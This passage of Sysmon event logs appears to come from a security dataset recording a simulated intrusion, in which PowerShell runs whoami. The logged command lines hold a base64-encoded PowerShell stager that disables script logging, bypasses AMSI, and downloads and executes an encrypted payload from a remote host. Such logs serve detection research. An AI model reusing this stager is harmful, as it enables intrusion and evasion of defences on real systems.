AGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==","ProcessId":"6504","ParentProcessId":"1648","host":"wec.internal.cloudapp.net","Severity":"INFO","SeverityValue":2,"Image":"C:\\Windows\\System32\\whoami.exe","LogonGuid":"{297bc33e-60f0-5f2b-22a6-2b0000000000}","SourceModuleType":"im_msvistalog","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","Version":5,"Company":"Microsoft Corporation","EventTime":"2020-08-07 10:32:45","Task":1,"SourceName":"Microsoft-Windows-Sysmon","CurrentDirectory":"C:\\windows\\system32\\","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2020-08-07 14:32:45.881\r\nProcessGuid: {297bc33e-660d-5f2d-8407-000000000400}\r\nProcessId: 6504\r\nImage: C:\\Windows\\System32\\whoami.exe\r\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\r\nDescription: whoami - displays logged on user information\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: whoami.exe\r\nCommandLine: \"C:\\windows\\system32\\whoami.exe\" /user\r\nCurrentDirectory: C:\\windows\\system32\\\r\nUser: THESHIRE\\pgustavo\r\nLogonGuid: {297bc33e-60f0-5f2b-22a6-2b0000000000}\r\nLogonId: 0x2BA622\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA1=8F1F9E265911956C7F8F3861C34DEF9B8FA63813,MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88\r\nParentProcessGuid: {297bc33e-65d0-5f2d-8207-000000000400}\r\nParentProcessId: 1648\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAFIAUwBpAE8ATgBUAGEAYgBsAEUALgBQAFMAVgBlAHIAcwBpAE8ATgAuAE0AYQBKAE8AcgAgAC0AZwBFACAAMwApAHsAJAA5ADMAOQA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAeQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJAA5ADMAOQApAHsAJAA3ADkAMAA9ACQAOQAzADkALgBHAGUAVABWAEEATABVAGUAKAAkAE4AdQBMAEwAKQA7AEkARgAoACQANwA5ADAAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA3ADkAMABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAQwB0AGkAbwBOAFMALgBHAEUATgBlAHIASQBjAC4ARABJAEMAdABJAE8AbgBBAHIAWQBbAHMAdAByAEkAbgBnACwAUwBZAFMAdABFAE0ALgBPAEIAagBlAEMAdABdAF0AOgA6AG4AZQB3ACgAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA3ADkAMABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUAbABTAGUAewBbAFMAQwByAEkAUAB0AEIATABvAGMASwBdAC4AIgBHAGUAdABGAEkAZQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAGwAdQBFACgAJABOAFUATABMACwAKABOAGUAdwAtAE8AQgBKAGUAQwB0ACAAQwBPAEwAbABlAGMAVABpAE8ATgBTAC4ARwBlAG4AZQBSAGkAYwAuAEgAQQBzAEgAUwBFAHQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAFMAcwBFAE0AYgBMAFkALgBHAGUAdABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAGUARgAuAEcAZQBUAEYASQBlAEwARAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAGwAVQBlACgAJABuAHUATABsACwAJAB0AHIAdQBFACkAOwB9ADsAWwBTAFkAUwB0AGUAbQAuAE4AZQBUAC4AUwBlAFIAVgBpAEMARQBQAG8AaQBuAFQATQBhAE4AQQBnAGUAUgBdADoAOgBFAHgAcABlAGMAdAAxADAAMABDAG8ATgBUAEkAbgB1AGUAPQAwADsAJAA1ADUARgA9AE4ARQB3AC0ATwBCAEoARQBjAFQAIABTAFkAcwBUAGUATQAuAE4AZQBUAC4AVwBlAGIAQwBsAEkAZQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAGQASQBuAGcAXQA6ADoAVQBOAGkAYwBPAGQAZQAuAEcAZQBUAFMAVABSAEkATgBHACgAWwBDAE8AbgB2AEUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAFMARQA2ADQAUwBUAFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJAA1ADUAZgAuAEgARQBBAEQARQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUANQBGAC4AUABSAE8AeABZAD0AWwBTAHkAUwB0AEUATQAuAE4AZQBUAC4AVwBFAGIAUgBlAFEAdQBFAFMAVABdADoAOgBEAGUARgBhAFUATABUAFcAZQBiAFAAUgBPAFgAWQA7ACQANQA1AEYALgBQAFIATwBYAFkALgBDAFIARQBkAEUAbgB0AEkAQQBsAFMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4AZQBUAC4AQwBSAEUAZABFAG4AdABJAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAEYAYQB1AGwAVABOAGUAdAB3AG8AUgBLAEMAUgBFAGQAZQBuAFQASQBBAGwAUwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAA1ADUAZgAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AFMAVABFAE0ALgBUAGUAWABUAC4ARQBuAGMATwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQBUAGUAUwAoACcAawApAGcASgAlAHgAMQBeAFMARABVAEcAIQB1AEsAbQA/AEwAdgAqAGIAZQBbAC0AbwBpAHkALwA0AHcAVAB8ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANQA1AGYALgBIAEUAYQBkAEUAcgBTAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAVgB4AGoAQgBwAEUAdQA9ADUARQBqAEUASQAwAGwARQA1AFcAWAAwAFAAdABSAGEARAAvAEEASwA1AFIATwBQAFYAeABVAD0AIgApADsAJABEAEEAVABBAD0AJAA1ADUAZgAuAEQAbwB3AE4ATABvAEEARABEAGEAVABBACgAJABzAGUAUgArACQAVAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAGQAQQB0AGEAPQAkAEQAQQBUAEEAWwA0AC4ALgAkAEQAQQB0AGEALgBsAEUATgBHAHQASABdADsALQBqAE8ASQBuAFsAQwBIAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==","IntegrityLevel":"High","CommandLine":"\"C:\\windows\\system32\\whoami.exe\" /user","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceModuleName":"eventlog","LogonId":"0x2ba622","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:45.881","Domain":"NT AUTHORITY","ExecutionProcessID":3284,"User":"THESHIRE\\pgustavo","Hashes":"SHA1=8F1F9E265911956C7F8F3861C34DEF9B8FA63813,MD5=2EEEEC89E705F73FFBCAE014E1828788,SHA256=A8A4C4719113B071BB50D67F6E12C188B92C70EEAFDFCD6F5DA69B6AAA99A7FD,IMPHASH=7FF0758B766F747CE57DFAC70743FB88","Description":"whoami - displays logged on user information","TerminalSessionId":"2","ParentProcessGuid":"{297bc33e-65d0-5f2d-8207-000000000400}","UserID":"S-1-5-18","EventID":1,"Product":"Microsoft® Windows® Operating System","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":725679,"Keywords":-9223372036854775808,"ProcessGuid":"{297bc33e-660d-5f2d-8407-000000000400}","tags":["mordorDataset"],"RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.591Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\Status\r\nDetails: DWORD (0x00000000)","SourceModuleName":"eventlog","ProcessId":"1696","Details":"DWORD (0x00000000)","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\Status","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757091,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"SetValue","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":13,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.592Z","OpcodeValue":0,"Message":"Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\LoggingStatus\r\nDetails: DWORD (0x00000000)","SourceModuleName":"eventlog","ProcessId":"1696","Details":"DWORD (0x00000000)","port":60122,"AccountName":"SYSTEM","EventReceivedTime":"2020-08-07 10:32:47","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine\\Extension-List\\{00000000-0000-0000-0000-000000000000}\\LoggingStatus","SeverityValue":2,"EventID":13,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757092,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"TargetProcessGUID":"{297bc33e-660d-5f2d-8407-000000000400}","@version":"1","EventType":"INFO","Version":3,"ThreadID":4364,"EventTime":"2020-08-07 10:32:45","Task":10,"AccountType":"User","SourceProcessGUID":"{297bc33e-65d0-5f2d-8207-000000000400}","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9d8e4|C:\\windows\\System32\\KERNELBASE.dll+5f36a|C:\\windows\\System32\\KERNELBASE.dll+5bd06|C:\\windows\\System32\\KERNEL32.DLL+1be93|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\36b90e5ba6d9ea1017ac036f93fce3e0\\System.ni.dll+384236|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\36b90e5ba6d9ea1017ac036f93fce3e0\\System.ni.dll+2c4809|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\36b90e5ba6d9ea1017ac036f93fce3e0\\System.ni.dll+2c4179|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+4523dc64(wow64)|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+45194f95(wow64)|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+4521f5c8(wow64)|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+4521f286(wow64)|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+4532265a(wow64)|UNKNOWN(00007FF8107465A1)","Channel":"Microsoft-Windows-Sysmon/Operational","SourceName":"Microsoft-Windows-Sysmon","OpcodeValue":0,"Hostname":"WORKSTATION5.theshire.local","@timestamp":"2020-08-07T14:32:47.598Z","Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-08-07 14:32:45.880\r\nSourceProcessGUID: {297bc33e-65d0-5f2d-8207-000000000400}\r\nSourceProcessId: 1648\r\nSourceThreadId: 7324\r\nSourceImage: C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nTargetProcessGUID: {297bc33e-660d-5f2d-8407-000000000400}\r\nTargetProcessId: 6504\r\nTargetImage: C:\\windows\\system32\\whoami.exe\r\nGrantedAccess: 0x1FFFFF\r\nCallTrace: C:\\windows\\SYSTEM32\\ntdll.dll+9d8e4|C:\\windows\\System32\\KERNELBASE.dll+5f36a|C:\\windows\\System32\\KERNELBASE.dll+5bd06|C:\\windows\\System32\\KERNEL32.DLL+1be93|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\36b90e5ba6d9ea1017ac036f93fce3e0\\System.ni.dll+384236|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\36b90e5ba6d9ea1017ac036f93fce3e0\\System.ni.dll+2c4809|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System\\36b90e5ba6d9ea1017ac036f93fce3e0\\System.ni.dll+2c4179|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+4523dc64(wow64)|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+45194f95(wow64)|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+4521f5c8(wow64)|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+4521f286(wow64)|C:\\windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\9fa5687516b51cdf6fb1317b592061b8\\System.Management.Automation.ni.dll+4532265a(wow64)|UNKNOWN(00007FF8107465A1)","SourceModuleName":"eventlog","ProcessId":"1648","SourceImage":"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:45.880","GrantedAccess":"0x1fffff","Domain":"NT AUTHORITY","ExecutionProcessID":3284,"host":"wec.internal.cloudapp.net","SourceProcessId":"1648","SourceThreadId":"7324","Severity":"INFO","TargetProcessId":"6504","SeverityValue":2,"EventID":10,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":725680,"SourceModuleType":"im_msvistalog","Keywords":-9223372036854775808,"TargetImage":"C:\\windows\\system32\\whoami.exe","RuleName":"-"}
{"tags":["mordorDataset"],"@version":"1","EventType":"CreateKey","Version":2,"ThreadID":4208,"EventTime":"2020-08-07 10:32:46","Task":12,"AccountType":"User","Channel":"Microsoft-Windows-Sysmon/Operational","EventTypeOrignal":"INFO","SourceName":"Microsoft-Windows-Sysmon","Hostname":"MORDORDC.theshire.local","@timestamp":"2020-08-07T14:32:47.598Z","OpcodeValue":0,"Message":"Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-08-07 14:32:46.561\r\nProcessGuid: {9f85ce58-59de-5f2b-2400-000000000400}\r\nProcessId: 1696\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History","SourceModuleName":"eventlog","ProcessId":"1696","EventReceivedTime":"2020-08-07 10:32:47","port":60122,"AccountName":"SYSTEM","UtcTime":"2020-08-07 14:32:46.561","Domain":"NT AUTHORITY","ExecutionProcessID":3888,"host":"wec.internal.cloudapp.net","Severity":"INFO","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History","SeverityValue":2,"EventID":12,"UserID":"S-1-5-18","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","RecordNumber":757093,"Image":"C:\\windows\\system32\\svchost.exe","Keywords":-9223372036854775808,"ProcessGuid":"{9f85ce58-59de-5f2b-2400-000000000400}","SourceModuleType":"im_msvistalog","RuleName":"-"}
{"tags":["mordorDataset"],"TargetProcessGUID":"{297bc33e-660d-5f2d-8407-000000000400}","@version":"1","EventType":"INFO","Version":3,"ThreadID":4364,"EventTime":"2020-08-07 10:32:45","Task":10,"AccountType":"User","SourceProcessGUID":"{297bc33e-60ec-5f2b-6d02-000000000400}","CallTrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9c534|C:\\windows\\system32\\basesrv.DLL+2fba|C:\\windows\\SYSTEM32\\CSRSRV.dll+5af4|C:\\windows\\SYSTEM32\\ntdll.dll+6ce5f","Channel":"Microsoft-Windows-Sysmon/Operational","SourceName":"Microsoft-Windows-Sysmon","OpcodeValue":0,"Hostname":"WORKSTATION5.theshire.local","@timestamp":"2020-08-07T14:32:47.598Z","Message":"Process accessed:\r\nRuleName: -\r\nUtcTime: 2020-08-07 14:32:45.880\r\nSourceProcessGUID: {297bc33e-60ec-5f2b-6d02-000000000400}\r\nSourceProcessId: 2808\r\nSourceThreadId: 8136\r\nSourceImage: C:\\windows\\system32\\csrss.exe\r\nTargetProcessGUID: {297bc33e-660d-5f2d-8407-000000000400}\r\nTargetProcessId: 6504\r\nTargetImage: C:\\windows\\system32\\whoami.exe\r\nGrantedAccess: 0x1FFFFF\r\nCallTrace: 